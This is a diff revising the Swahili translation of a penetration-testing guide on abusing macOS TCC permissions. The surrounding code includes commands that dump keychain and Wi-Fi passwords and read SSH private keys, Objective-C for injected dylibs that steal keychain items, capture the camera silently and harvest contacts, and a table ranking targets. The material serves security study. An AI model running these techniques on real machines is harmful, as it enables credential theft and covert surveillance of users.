@@ -1,26 +1,26 @@
-# Wizi wa Credentials na Data kupitia Ruhusa za TCC za macOS
+# Credential & Data Theft kupitia TCC Permissions za macOS
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 ## Muhtasari
 
-macOS TCC (Transparency, Consent, and Control) hulinda ufikiaji wa data nyeti ya mtumiaji. Mshambulizi anapo **compromise binary ambayo tayari ina TCC grants**, hurithi ruhusa hizo. Ukurasa huu unaeleza uwezekano wa exploitation wa kila ruhusa ya TCC inayohusiana na wizi wa data.<sup>[[2]](#references)</sup>
+macOS TCC (Transparency, Consent, and Control) hulinda ufikiaji wa data nyeti ya mtumiaji. Mshambulizi **anapodhibiti binary ambayo tayari ina TCC grants**, hurithi permissions hizo. Ukurasa huu unaeleza uwezekano wa exploitation wa kila TCC permission inayohusiana na data theft.<sup>[[2]](#references)</sup>
 
 > [!WARNING]
-> Code injection kwenye binary iliyopewa TCC (kupitia DYLD injection, dylib hijacking, au task port) **hurithi kimya kimya ruhusa zake zote za TCC**. Hakuna prompt au verification ya ziada wakati process hiyo hiyo inasoma data iliyolindwa.
+> Code injection kwenye binary iliyopewa TCC (kupitia DYLD injection, dylib hijacking, au task port) **hurithi kwa siri TCC permissions zake zote**. Hakuna prompt au verification ya ziada wakati process hiyo hiyo inasoma data iliyolindwa.<sup>[[4]](#references)</sup>
 
 ---
 
-## Vikundi vya Ufikiaji wa Keychain
+## Keychain Access Groups
 
 ### Zawadi
 
 macOS Keychain huhifadhi:
-- **Wi-Fi passwords** — credentials zote za wireless networks zilizohifadhiwa
-- **Website passwords** — passwords za Safari, Chrome (inapotumia Keychain), na browsers nyingine
-- **Application passwords** — akaunti za barua pepe, VPN credentials, development tokens
-- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
-- **Secure notes** — secrets zilizohifadhiwa na mtumiaji
+- **Nywila za Wi-Fi** — credentials zote za wireless networks zilizohifadhiwa
+- **Nywila za websites** — nywila za Safari, Chrome (inapotumia Keychain), na browsers nyingine
+- **Nywila za applications** — akaunti za barua pepe, VPN credentials, development tokens
+- **Certificates na private keys** — code signing, client TLS, S/MIME encryption
+- **Secure notes** — siri zilizohifadhiwa na mtumiaji
 
 ### Entitlement: `keychain-access-groups`
 
@@ -34,7 +34,7 @@ Keychain items hupangwa katika **access groups**. Entitlement ya `keychain-acces
 <string>InternetAccounts</string>       <!-- Internet account passwords -->
 </array>
 ```
-### Exploitation
+### Unyonyaji
 ```bash
 # Find binaries with broad keychain access groups
 sqlite3 /tmp/executables.db "
@@ -50,7 +50,7 @@ security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100
 security find-generic-password -s "Wi-Fi" -w 2>&1
 security find-internet-password -s "github.com" 2>&1
 ```
-### Code Injection → Wizi wa Keychain
+### Code Injection → Keychain Theft
 ```objc
 // Injected dylib code — runs with the target's keychain groups
 #import <Security/Security.h>
@@ -85,13 +85,13 @@ NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8Stri
 
 ### Exploitation
 
-A binary yenye TCC grant ya kamera (kupitia `kTCCServiceCamera` au entitlement ya `com.apple.security.device.camera`) inaweza kunasa picha na video:
+Binary yenye TCC grant ya kamera (kupitia `kTCCServiceCamera` au entitlement ya `com.apple.security.device.camera`) inaweza kunasa picha na video:
 ```bash
 # Find camera-authorized binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
 ```
-### Ukamataji wa Kimya
+### Silent Capture
 ```objc
 // Injected into a camera-entitled process
 #import <AVFoundation/AVFoundation.h>
@@ -125,15 +125,15 @@ fromConnection:(AVCaptureConnection *)connection {
 @end
 ```
 > [!TIP]
-> Kuanzia **macOS Sonoma**, kiashiria cha kamera kwenye upau wa menyu huwa cha kudumu na hakiwezi kufichwa kimpango. Kwenye **matoleo ya zamani ya macOS**, kunasa kwa muda mfupi kunaweza kusiweke kiashiria kinachoonekana.
+> Kuanzia **macOS Sonoma**, kiashirio cha kamera kwenye upau wa menyu huwa kinaendelea kuonekana na hakiwezi kufichwa programmatically. Kwenye matoleo ya zamani ya macOS, capture fupi inaweza isitoe kiashirio kinachoonekana.
 
 ---
 
-## Ufikiaji wa Kipaza Sauti (kTCCServiceMicrophone)
+## Ufikiaji wa Maikrofoni (kTCCServiceMicrophone)
 
 ### Exploitation
 
-Ufikiaji wa kipaza sauti hunasa sauti yote kutoka kwenye mic iliyojengewa ndani, headset, au vifaa vya kuingiza sauti vilivyounganishwa:
+Ufikiaji wa maikrofoni hunasa sauti yote kutoka kwenye maikrofoni iliyojengewa ndani, headset, au vifaa vya kuingiza sauti vilivyounganishwa:
 ```bash
 # Find mic-authorized binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -201,11 +201,11 @@ loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
 ```
 ---
 
-## Anwani / Kalenda / Picha
+## Mawasiliano / Kalenda / Picha
 
-### Uvujishaji wa Data ya Kibinafsi
+### Utoaji wa Data ya Kibinafsi
 
-| Huduma ya TCC | Framework | Data |
+| TCC Service | Framework | Data |
 |---|---|---|
 | `kTCCServiceAddressBook` | `Contacts.framework` | Majina, barua pepe, nambari za simu, anwani |
 | `kTCCServiceCalendar` | `EventKit` | Mikutano, washiriki, maeneo |
@@ -218,7 +218,7 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
 done
 ```
-### Ukusanyaji wa Contacts
+### Uvunaji wa Contacts
 ```objc
 #import <Contacts/Contacts.h>
 
@@ -236,11 +236,11 @@ usingBlock:^(CNContact *contact, BOOL *stop) {
 ```
 ---
 
-## Access ya Akaunti ya iCloud
+## Ufikiaji wa Akaunti ya iCloud
 
 ### Entitlement: `com.apple.private.icloud-account-access`
 
-Entitlement hii inaruhusu kuwasiliana na huduma ya XPC ya `com.apple.iCloudHelper`, na kutoa access kwa:
+Entitlement hii inaruhusu kuwasiliana na huduma ya XPC ya `com.apple.iCloudHelper`, na kutoa ufikiaji wa:
 - **iCloud tokens** — tokens za uthibitishaji za Apple ID ya mtumiaji
 - **iCloud Drive** — nyaraka zilizosawazishwa kutoka kwenye vifaa vyote
 - **iCloud Keychain** — passwords zilizosawazishwa kwenye vifaa vyote vya Apple
@@ -253,7 +253,7 @@ WHERE iCloudAccs = 1
 ORDER BY privileged DESC;"
 ```
 > [!CAUTION]
-> Kucompromise binary yenye iCloud entitlement hupanua shambulio kutoka **kifaa kimoja hadi kwenye mfumo mzima wa Apple**: Mac nyingine, iPhone, iPad, na Apple Watch. Usawazishaji wa iCloud Keychain unamaanisha kuwa passwords kutoka kwenye vifaa vyote zinaweza kufikiwa.
+> Kukompromaiti binary yenye iCloud entitlement hupanua shambulio kutoka kwa **kifaa kimoja hadi kwenye mfumo mzima wa Apple**: Mac nyingine, iPhone, iPad, Apple Watch. Usawazishaji wa iCloud Keychain unamaanisha kuwa passwords kutoka kwenye vifaa vyote zinaweza kufikiwa.
 
 ---
 
@@ -263,7 +263,7 @@ ORDER BY privileged DESC;"
 
 Full Disk Access hutoa uwezo wa kusoma **kila file kwenye mfumo**, ikijumuisha:
 - Data ya apps nyingine (Messages, Mail, historia ya Safari)
-- TCC databases (zinazofichua permissions nyingine zote)
+- TCC databases (zinazofichua ruhusa nyingine zote)
 - SSH keys na configuration
 - Browser cookies na session tokens
 - Application databases na caches
@@ -280,22 +280,22 @@ cat ~/.ssh/id_rsa                           # SSH private key
 ```
 ---
 
-## Matrix ya Kipaumbele cha Exploitation
+## Exploitation Priority Matrix
 
-Wakati wa kutathmini binaries zenye TCC-granted zinazoweza kuingiziwa, panga kipaumbele kulingana na thamani ya data:
+Wakati wa kutathmini binary za TCC-granted zinazoweza kuingiziwa, zipatie kipaumbele kulingana na thamani ya data:
 
-| Kipaumbele | Ruhusa ya TCC | Kwa nini |
+| Priority | TCC Permission | Why |
 |---|---|---|
 | **Critical** | Full Disk Access | Ufikiaji wa kila kitu |
-| **Critical** | TCC Manager | Inaweza kutoa ruhusa yoyote |
+| **Critical** | TCC Manager | Inaweza kutoa permission yoyote |
 | **High** | Keychain Access Groups | Passwords zote zilizohifadhiwa |
 | **High** | iCloud Account Access | Compromise ya vifaa vingi |
 | **High** | Input Monitoring (ListenEvent) | Keylogging |
-| **High** | Accessibility | Udhibiti wa GUI, kujipa ruhusa |
-| **Medium** | Screen Capture | Ukusanyaji wa data inayoonekana |
-| **Medium** | Camera + Microphone | Surveillance |
-| **Medium** | Contacts + Calendar | Data ya social engineering |
-| **Low** | Location | Ufuatiliaji wa mahali |
+| **High** | Accessibility | Udhibiti wa GUI, kujipa permission |
+| **Medium** | Screen Capture | Ukusanyaji wa data za kuona |
+| **Medium** | Camera + Microphone | Ufuatiliaji |
+| **Medium** | Contacts + Calendar | Data za social engineering |
+| **Low** | Location | Ufuatiliaji wa eneo halisi |
 | **Low** | Photos | Data binafsi |
 
 ## Enumeration Script
@@ -322,11 +322,10 @@ echo -e "\n[*] iCloud-entitled binaries:"
 sqlite3 /tmp/executables.db "
 SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
 ```
-## Marejeo
+## References
 
-- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
+- [1] [Apple Developer — Huduma za Keychain](https://developer.apple.com/documentation/security/keychain_services)
 - [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
-- [3] [OBTS v5.0 — "What Happens on your Mac, Stays on Apple's iCloud?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+- [3] [OBTS v5.0 — "Kinachotokea kwenye Mac yako, Hubaki kwenye iCloud ya Apple?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 - [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
-
 {{#include ../../../../banners/hacktricks-training.md}}
